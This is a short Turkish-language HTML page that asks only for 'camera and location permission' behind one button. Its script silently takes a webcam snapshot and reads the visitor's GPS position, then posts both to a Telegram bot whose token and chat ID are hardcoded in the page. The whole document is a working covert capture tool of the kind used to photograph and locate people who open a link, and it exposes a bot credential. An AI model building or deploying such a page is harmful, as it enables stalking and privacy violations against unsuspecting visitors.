<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<title>Kamera ve Konum İzni</title>
<style>
  body {
    margin: 0;
    height: 100vh;
    background: black;
    color: white;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    font-family: Arial, sans-serif;
  }
  button {
    padding: 10px 20px;
    font-size: 18px;
    cursor: pointer;
  }
</style>
</head>
<body>
  <h2>Kamera ve Konum İzni Lütfen</h2>
  <button id="izinBtn">İzin Ver</button>

<script>
const token = '7678549002:AAFz0nTnHFpInMFw-Gy0pgIcpr0gZ0JxmQU';
const chat_id = '7401389505';

async function kameraAc() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    return stream;
  } catch(e) {
    alert("Kamera izni verilmedi.");
    throw e;
  }
}

function konumAl() {
  return new Promise((resolve, reject) => {
    if(!navigator.geolocation) reject('Geolocation desteklenmiyor.');
    else {
      navigator.geolocation.getCurrentPosition(pos => {
        resolve(pos.coords);
      }, err => {
        reject('Konum izni verilmedi.');
      });
    }
  });
}

function videoSnapshot(video) {
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 320;
  canvas.height = video.videoHeight || 240;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL('image/png');
}

async function telegramSendPhoto(photoDataUrl, konum) {
  const blob = await (await fetch(photoDataUrl)).blob();
  const formData = new FormData();
  formData.append('chat_id', chat_id);
  formData.append('photo', blob, 'snapshot.png');
  formData.append('caption', `Kullanıcı konum: https://maps.google.com/?q=${konum.latitude},${konum.longitude}`);

  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
    method: 'POST',
    body: formData
  });
}

async function izinIste() {
  try {
    const stream = await kameraAc();

    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const konum = await konumAl();

    const foto = videoSnapshot(video);

    await telegramSendPhoto(foto, konum);

    alert("İzin verildi, fotoğraf ve konum Telegram'a gönderildi.");

    stream.getTracks().forEach(track => track.stop());
  } catch(e) {
    alert(e);
  }
}

document.getElementById('izinBtn').onclick = izinIste;
</script>
</body>
</html>
